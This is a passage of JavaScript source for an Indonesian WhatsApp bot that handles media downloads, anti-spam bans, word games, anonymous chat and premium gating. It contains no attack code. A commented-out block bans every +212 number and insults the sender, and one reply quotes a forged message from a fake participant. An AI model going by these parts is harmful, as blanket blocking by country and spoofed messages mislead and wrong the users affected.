let tkes = `*------------[ TIKTOKNOWM ]------------*\n\n𖦹 *ID:* ${data.data.id}\n𖦹 *Region:* ${data.data.region}\n𖦹 *Judul:* ${data.data.title}\n𖦹 *Durasi:* ${data.data.duration}\n𖦹 *Music:* ${data.data.music}\n𖦹 *Info Musik:*\n- *Judul:* ${data.data.music_info.title}\n- *Author:* ${data.data.music_info.author}\n𖦹 *Diputar:* ${h2k(data.data.play_count)}\n𖦹 *Jumlah Komentar:* ${data.data.comment_count}\n𖦹 *Jumlah Share:* ${data.data.share_count}\n𖦹 *Didownload:* ${data.data.download_count} kali` 
conn.sendMessage(from, {video: {url: data.data.play}, caption: tkes}, {quoted: dev})
}
  /*
savefrom(budy).then(res => {
conn.sendMessage(from, {caption: `*------------[ TIKTOKNOWM ]------------*\n\n• Autor: ${res.meta.source}\n${res.meta.title}`, video: {url: res.url[0].url}}, {quoted: dev})})
*/
} catch (err){ 
  savefrom(budy).then(res => {
conn.sendMessage(from, {caption: `*------------[ TIKTOKNOWM ]------------*\n\n• Autor: ${res.meta.source}\n${res.meta.title}`, video: {url: res.url[0].url}}, {quoted: dev})})
  console.log(err)
}
} 

//Auto Download Video FB
if(budy.includes('https://www.facebook.com/')){
try{
let res = await savefrom(budy)
conn.sendMessage(from, {caption: "*FACEBOOK DOWNLOAD*", video: {url: res.url[0].url}}, {quoted: dev})
} catch (err){ return
}
}

//Auto Download Video IG
if(budy.startsWith("https://www.instagram.com/reel/") || budy.startsWith('https://www.instagram.com/p/')){
try{
let res = await instagram3 (budy)
    for (let i of res) {
await sleep (2000)
conn.sendMedia(from, i, dev)
//conn.sendFile(from, i, dev)
    }
} catch (err){ return
}
}

  
  //========================================================================================================================//
let colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isText = (type == 'conversation')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessageV')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')



const addSpammer = function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
 } else {
let bulin = ({ id: jid, spam: 1 })
 _db.push(bulin)     
}
}

const FinisHim = async function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if(_db[position].spam > 7){
if(db.data.users[sender].banned.status || !isOwner){return}
let obj = {
id: senderNumber,
status: true,
date: calender,
reason: "Spam Bot"
}
db.data.users[woke].banned = obj               
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply("Kamu telah di banned karena telah melakukan spam")
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}

  /*
//user pc
if (!isGroup && user && isPremium && new Date - user.pc < 86400000) {
} else if(!isGroup && user) {
setReply( `Hai ${ucapanWaktu} kak *${pushname}*  ada yang bisa aku bantu ? silakan ketik ${prefix}menu`)
user.pc = new Date * 1
}
*/


  
  
//ANTI SPAM BERAKHIR
if(SpamExpired(senderNumber, "Case", AntiSpam)){
let position = false
for(let i of spammer){
if(i.id == senderNumber){
position = i
}
}
    
if (position !== false) {
spammer.splice(position, 1)
console.log(chalk.bgGreen(color("[  Remove ]", "black")),"Sukses remove spammer")
}
}


SpamExpired(senderNumber, "NotCase", AntiSpam)
if(isBanned && !isOwner){return} //user terbanned
if(isCmd && cekSpam("Case",senderNumber, AntiSpam)){
addSpammer(senderNumber, spammer)
FinisHim(senderNumber, spammer)
console.log(chalk.bgYellowBright(color("[  SPAM  ]", "black")),"antispam Case aktif")
return
}

//ANTI SPAM PRIVATE CHAT
if (antiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner ) {
addSpam("Case",senderNumber, "8s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}

//ANTI SPAM GROUP CHAT     
if (antiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
addSpam("Case",senderNumber, "8s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}
if (isCmd && !isOwner) msgFilter.addFilter(from)




         // Secreto
              if(!isGroup){
                if (!dev.key.fromMe && secreto.find(i => i.sender === sender)) {
                   var dbx = secreto.find(i => i.sender === sender)
                   if (dbx.status === 'ENTER-MESSAGE') {
                     if (['conversation', 'extendedTextMessage'].includes(dev.type)) {
                       var teks_balasan = `Hai kak, kamu menerima pesan balasan nih\n\nPesan Balasannya:\n${budy}\n\n\n_ingat pesan ini satu kali kirim saja yaa_`
                       conn.sendMessage(dbx.pengirim, { text: teks_balasan })
                       reply(`Sukses mengirimkan balasan, ingat pesan ini satu kali kirim saja yaa`)
                     } else {
                       var teks_balasan = `Hai kak, kamu menerima pesan balasan nih\n\nPesan Balasannya :\n${budy}\n\n\n_ingat pesan ini satu kali kirim saja yaa_`
                       var pes = await conn.sendMessage(dbx.pengirim, { text: teks_balasan })
                       conn.sendMessage(dbx.pengirim, { forward: dev }, { quoted: pes })
                       reply(`Sukses mengirimkan balasan, ingat pesan ini satu kali kirim saja yaa`)
                     }
                     var pos = secreto.indexOf(dbx)
                     secreto.splice(pos, 1)
                     fs.writeFileSync('./database/secreto_balas.json', JSON.stringify(secreto, null, 2))
                   }
                }
              }

  
//System Expired
_sewa.expiredCheck(conn, sewa)
_prem.expiredCheck(premium) 
//autoClearChat(conn,clearchat)
  

  
//Make Sticker
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await conn.sendMessage(from,{sticker: nah},{quoted: dev})
await fs.unlinkSync(stok)
}


//Console Log
try{
var virus = m.message.extendedTextMessage.contextInfo.externalAdReply.title.length
}catch{
var virus = 100
}

if(type == "groupInviteMessage" && m.message.groupInviteMessage.caption.length > 8000||  type == "contactMessage" && m.message.contactMessage.displayName.length > 8000 || type == "imageMessage" && m.message.imageMessage.caption.length > 8000 || budy.length > 8000 && !itsMe  || type == "extendedTextMessage" && virus > 8000 && !itsMe ||  type == "productMessage" && m.message.productMessage.product.description.length > 8000 && !itsMe ||  type == "listMessage" && !itsMe) {
if(isGroup && isBotGroupAdmins) conn.sendMessage(from, { delete: m.key})
if(!isGroup) conn.chatModify({ clear: { messages: [{ id: m.id, fromMe: sender == botNumber? true : false, timestamp: m.messageTimestamp }] } }, sender, [])
console.log(chalk.bgRedBright(color("[ VIRTEXT ]", "black")),`Length: ${budy.length} from ${senderNumber} ${isGroup? `Group ${groupName}`: ""}`)
}


if (!isGroup && !isCmd ) console.log(color("[PRIVATE]", "greenyellow"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && !isCmd ) console.log(color("[GRUP]", "gold"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
if (!isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))

  
  
  
//GAME
//GAME MATH FUNCTION
conn.math = conn.math ? conn.math : {}
if(isGroup && from in conn.math){
if(!isGroup) {return} 
//console.log(conn.math)
try{
let id = from
if (!(id in conn.math) && /^apa hasil dari/i.test(budy)) return setReply('soal itu sudah berakhir')
let math = JSON.parse(JSON.stringify(conn.math[id][1]))
if (budy == math.result) {
user.balance += math.bonus
clearTimeout(conn.math[id][3])
delete conn.math[id]
await setReply(` benar\n\nSaldo: Rp${math.bonus}\n\nmath ${math.mode}`)
} else { 
  /*
if (--conn.math[id][2] == 0) {
clearTimeout(conn.math[id][3])
delete conn.math[id]
setReply(`*kesempatan habis!*\njawabannya adalah *${math.result}*`)
} else setReply(`*jawaban salah!*\nmasih ada ${conn.math[id][2]} kesempatan`)
}
*/
}
}catch(err){
console.log(err)
}
}

//GAME  teka teki Function
conn.tekateki = conn.tekateki ? conn.tekateki : {}  
if(isGroup && from in conn.tekateki){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.tekateki[id][2]
 var teks = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tekateki[id][2]} Money 💸`
 reply(teks)
 clearTimeout(conn.tekateki[id][3])
 delete conn.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
}


  //GAME Susunkata Function
conn.susunkata = conn.susunkata ? conn.susunkata : {}  
if(isGroup && from in conn.susunkata){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.susunkata[id][2]
   var teks = `*GAME SUSUN KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.susunkata[id][2]} Money 💸`
reply(teks)
 clearTimeout(conn.susunkata[id][3])
 delete conn.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}


  //GAME tebak kimia Function
conn.tebakkimia = conn.tebakkimia ? conn.tebakkimia : {}  
if(isGroup && from in conn.tebakkimia){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.tebakkimia[id][1]))
 let isSurender = /^((me)?nyerah|surr?ender)$/i.test(budy)

 if (budy.toLowerCase() == json.lambang.toLowerCase().trim()) {
user.balance += conn.tebakkimia[id][2]
 global.db.data.users[m.sender].exp += 10
   var teks = `*GAME TEBAK KIMIA*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebakkimia[id][2]} Money 💸`
   reply (teks)
 clearTimeout(conn.tebakkimia[id][3])
 delete conn.tebakkimia[id]
 } else if(similarity(budy.toLowerCase(), json.lambang.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 }

  
  
//GAME Caklontong Function
conn.caklontong = conn.caklontong ? conn.caklontong : {}  
if(isGroup && from in conn.caklontong){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.caklontong[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 global.db.data.users[m.sender].exp += conn.caklontong[id][2]
// global.db.data.users[m.sender].tiketcoin += 1
 setReply(`*Benar!*\n+${conn.caklontong[id][2]} XP\n+1500 Money\n${json.deskripsi}`)
 clearTimeout(conn.caklontong[id][3])
 delete conn.caklontong[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}


  //GAME tebak Lagu Function
conn.tebaklagu = conn.tebaklagu ? conn.tebaklagu : {}  
if(isGroup && from in conn.tebaklagu){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.tebaklagu[id][1]))
 
 if (budy.toLowerCase() == json.judul.toLowerCase().trim()) {
user.balance += conn.tebaklagu[id][2]
 var teks = `*GAME TEBAK LAGU*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebaklagu[id][2]} Money 💸`
   reply (teks)
 clearTimeout(conn.tebaklagu[id][3])
 delete conn.tebaklagu[id]
 } else if(similarity(budy.toLowerCase(), json.judul.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}

  
//GAME tebaktebak Function
conn.tebaktebak = conn.tebaktebak ? conn.tebaktebak : {}  
if(isGroup && from in conn.tebaktebak){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.tebaktebak[id][1]))
 
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.tebaktebak[id][2]
 global.db.data.users[m.sender].exp += 50
var teks = `*TEBAK TEBAKAN*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebaktebak[id][2]} Money 💸\n EXP: +50`
// global.db.data.users[m.sender].tiketcoin += 1
reply (teks)
   clearTimeout(conn.tebaktebak[id][3])
 delete conn.tebaktebak[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}


  //GAME tebak kata Function
conn.tebakkata = conn.tebakkata ? conn.tebakkata : {}  
if(isGroup && from in conn.tebakkata){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.tebakkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.tebakkata[id][2]
 var teks = `*GAME TEBAK KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebakkata[id][2]} Money 💸`
   reply (teks)
 clearTimeout(conn.tebakkata[id][3])
 delete conn.tebakkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}

  
//GAME tebak lirik Function
conn.tebaklirik = conn.tebaklirik ? conn.tebaklirik : {}  
if(isGroup && from in conn.tebaklirik){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let json = JSON.parse(JSON.stringify(conn.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.tebaklirik[id][2]
 global.db.data.users[m.sender].exp += 10
   var teks = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebaklirik[id][2]} Money 💸\n EXP: +10`
   reply (teks)
 clearTimeout(conn.tebaklirik[id][3])
 delete conn.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 }

       
//GAME siapa aku Function
conn.siapaaku = conn.siapaaku ? conn.siapaaku : {}
//conn.siapaaku = JSON.parse(fs.readFileSync('./database/siapaaku.json'))
if(isGroup && from in conn.siapaaku){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.siapaaku[id][2]
var teks = `*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.siapaaku[id][2]} Money 💸`
   reply (teks)
 clearTimeout(conn.siapaaku[id][3])
 delete conn.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`) 
}


  //GAME tebak gambar
conn.tebakgambar = conn.tebakgambar ? conn.tebakgambar : {}  
if(isGroup && from in conn.tebakgambar){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.tebakgambar[id][2]
 var teks = `*GAME TEBAK GAMBAR*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebakgambar[id][2]} Money 💸`
   reply (teks)
 clearTimeout(conn.tebakgambar[id][3])
 delete conn.tebakgambar[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
}

  
//Game Family 100
conn.family = conn.family ? conn.family : {}
if(isGroup && from in conn.family){
if(!isGroup) {return} 
let similarity = require('similarity')
let threshold = 0.72 // semakin tinggi nilai, semakin mirip
let id =  m.chat
let room = conn.family[id]
let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy)
if (!isSurrender) {
let index = room.jawaban.indexOf(text)
  
if (index < 0) {
if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) return setReply('Dikit lagi!')
 }
if (!isCmd && room.terjawab[index]) {return} 
user.balance += room.winScore
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length

let caption = `*GAME FAMILY100*

*Soal:* ${room.soal}

Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
 return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0]  : ''}`.trim() : false
 }).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
     `.trim()
  
conn.sendMessage(from, {text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net']}, {quoted: dev}).then(msg => {
 conn.family[id].msg = msg
}).catch(_ => _)
if (isWin || isSurrender) delete conn.family[id] 
//if (isWin || isSurrender) clearTimeout(200000)
}



  

if(isSimi){
//AUTO RESPON SIMI VIA REPLY/TAG BOT
const isReplySticker = type === 'stickerMessage' && content.includes('stickerMessage')
const isQuotedReplySticker = type === 'stickerMessage' && content.includes('extendedTextMessage')
const mentionByReplySticker = type == "stickerMessage" && dev.message.stickerMessage.contextInfo != null ? dev.message.stickerMessage.contextInfo.participant || "" : ""
if (Input == botNumber && isGroup && !replyCommand && !isAudio || mentionByReplySticker == botNumber && isSticker && !replyCommand) {
try{	
//await sleep(2000)
 //conn.sendPresenceUpdate('composing', from) 
if(isQuotedReplySticker || isReplySticker ){
//await sleep(2000)
let namastc = await pickRandom(Object.keys(db.data.sticker))
conn.sendMessage(from, {sticker: {url:db.data.sticker[namastc].link}}, {quoted:dev })
} else{

let jawab = ["Afa iyah 🗿","Oh","Aku ga ngerti om 🐦","Boong","🗿","🐦","Oh gitu 🐦"]        
let teks1 = pickRandom(jawab)
let teks2 = body
let hasil = [`${teks1}`,`${teks2}`]
let random = pickRandom(hasil)
  //console.log(idnya)
let kata = body.replace(`@${botNumber.split("@")[0]}`, "")
let kato = ["Kenapa ?","Ha ?","Napa tag gua ?","napa ?","ya ?","apa ?","Hmm ?"]
let acak = pickRandom(kato)
if(kata == "") return conn.sendMessage(from,{text: acak},{quoted: m}) 
  
//let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${body}&lc=id`)
//let sami = simi.success 
let gakm = (await axios("https://simsimi.vn/web/simtalk", { method: "post", data: "lc=id&text="+encodeURIComponent(budy) })).data
let sami = gakm.success
 if(sami.startsWith("Aku tidak mengerti")){
var teksnya = random
} else {
var teksnya = sami
}
conn.sendMessage(from, {text: sami}, {quoted: dev})
}
} catch (err){
return
}
}
}
  /*

//AUTO BLOCK NOMER ASING +212
let nomerAsing = senderNumber.startsWith('212')
if (nomerAsing) {
if(!db.data.users[sender].banned.status) {
db.data.users[sender].banned.status = true
db.data.users[sender].banned.reason = "Nomer asing +212"
}
console.log(`Nomer asing dari ${senderNumber}`)
await reply("you are not allowed to using this bot")
if(!isGroup) await conn.sendMessage(from, {text: "stupid"},{quoted: lep})
await conn.chatModify({delete: true,lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]},sender)
return conn.updateBlockStatus(sender, "block") 
} 
	*/



//sendFileUrl
const sendFileFromUrl = async (from, url, caption, dev, men) => {
			let mime = '';
			let res = await axios.head(url)
			mime = res.headers['content-type']
			if (mime.split("/")[1] === "gif") {
				return conn.sendMessage(from, {
					video: await convertGif(url),
					caption: caption,
					gifPlayback: true,
					mentions: men ? men : []
				}, {
					quoted: dev
				})
			}
			let type = mime.split("/")[0] + "Message"
			if (mime.split("/")[0] === "image") {
				return conn.sendMessage(from, {
					image: await getBuffer(url),
					caption: caption,
					mentions: men ? men : []
				}, {
					quoted: dev
				})
			} else if (mime.split("/")[0] === "video") {
				return conn.sendMessage(from, {
					video: await getBuffer(url),
					caption: caption,
					mentions: men ? men : []
				}, {
					quoted: dev
				})
			} else if (mime.split("/")[0] === "audio") {
				return conn.sendMessage(from, {
					audio: await getBuffer(url),
					caption: caption,
					mentions: men ? men : [],
					mimetype: 'audio/mpeg'
				}, {
					quoted: dev
				})
			} else {
				return conn.sendMessage(from, {
					document: await getBuffer(url),
					mimetype: mime,
					caption: caption,
					mentions: men ? men : []
				}, {
					quoted: dev
				})
			}
		}

//ANONYMOUS CHAT
const roomChat = Object.values(anonChat).find(room => [room.a, room.b].includes(m.sender) && room.state == 'CHATTING')
const roomA = Object.values(anonChat).find(room => room.a == m.sender)
const roomB = Object.values(anonChat).find(room => room.b == m.sender )
const room = Object.values(anonChat).find(room => room.state == 'WAITING' && room.b == "")

if (roomChat && !isCmd && !isGroup && roomChat.b !=="") {
//let nono = m.quoted.fakeObj? m.quoted.fakeObj : m
let other = [roomChat.a, roomChat.b].find(user => user !== m.sender)
m.copyNForward(other, true)
}

if (room && Date.now() >= room.expired){

await conn.sendMessage(room.a, {text:"Partner tidak di temukan\nKamu telah keluar dari room anonymous"})
anonChat.splice(anonChat.indexOf(room, 1)) 
}





//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}

//FITUR USER PREMIUM
if(!checkDataName("premium", "", DataId)) { 
await createDataId("premium", DataId) 
}
let userPremium =  DataId.filter(item => item.name == "premium" )
for(let i of userPremium[0].id){
if(command == i && !isPremium) return setReply(`Kamu bukan user premium`)
}

//FITUR KHUSUS OWNER
if(!checkDataName("commands", "", DataId)) { 
await createDataId("commands", DataId) 

}
let ownerCommands =  DataId.filter(item => item.name == "commands" )
for(let i of ownerCommands[0].id){
if(command == i && !isOwner) return onlyOwner()
} 

//FITUR USER LIMIT
if(!checkDataName("limit", "", DataId)) { 
await createDataId("limit", DataId) 
}
let userLimit =  DataId.filter(item => item.name == "limit" )
for(let i of userLimit[0].id){
if(!isOwner && command == i ){
if(!isPremium && db.data.users[sender].limit < 1) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!isPremium) {
db.data.users[sender].limit -= 1
conn.sendMessage(from,{text:`Limit kamu tersisa ${db.data.users[sender].limit}`}, {quoted: dev})
}
  
}
}

//USER AFK
if (user && user.afk > -1) {
  
setReply(`${pushname}, Kamu telah berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afk)}`.trim())
user.afk = -1
user.afkReason = ''
}
let jids = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of jids) {
const nama = await conn.getName(jid)
let userAfk = global.db.data.users[jid]
if (!userAfk) continue
let afkTime = userAfk.afk
if (!afkTime || afkTime < 0) continue
let reason = userAfk.afkReason || ''
 setReply(`
Jangan tag dia!
*${nama}* sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
} 

  
//Auto Sticker Online
if(db.data.sticker[budy]){ 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "5s", AntiSpam)
conn.sendMessage(from,{sticker:{url:db.data.sticker[budy].link}}, {quoted: dev})
}


  


  
//Auto VN Online  
if(db.data.audio[budy]) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
 let nono =  {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${db.data.audio[budy].name}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const iniQuoted = mentionByReply? m.quoted.fakeObj : nono 
conn.sendMessage(from, {audio: {url: db.data.audio[budy].link},ptt: true, mimetype: 'audio/mpeg'}, {quoted: iniQuoted }) 
addSpam("NotCase",senderNumber, "5s", AntiSpam)
}

//Auto clear trash session
if(budy.includes('🗿')){
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return console.log('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state"))
if(filteredArray.length == 0) return 
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
console.log('Menghapus Sampah di Session')
});
}
  
  
 
//Auto Hit 
expiredCmd(hitnya, dash)
const thisHit = `${getHit("run", hitnya)}`  
//add to dashboard  db.data.allcommand.push(toFirstCase(command)) //
//if(!isGroup) //addAutoClear(m, "1h", clearchat)  
if(isCmd){
db.data.users[sender].hit += 1
cmdAdd("run", "1d", hitnya)
Succes(toFirstCase(command), dash, allcommand)
}


	
	        //Suit PvP
	    conn.suit = conn.suit ? conn.suit : {}
	    let roof = Object.values(conn.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(budy) && isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(budy)) {
	    conn.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, dev)
	    delete conn.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    conn.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) conn.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) conn.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) conn.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    conn.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete conn.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = sender == roof.p
	    let jwb2 = sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(budy) && !roof.pilih && !isGroup) {
	    roof.pilih = reg.exec(budy.toLowerCase())[0]
	    roof.text = budy
	    setReply(`Kamu telah memilih ${budy} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) conn.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(budy) && !roof.pilih2 && !isGroup) {
	    roof.pilih2 = reg.exec(budy.toLowerCase())[0]
	    roof.text2 = budy
	    setReply(`Kamu telah memilih ${budy} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
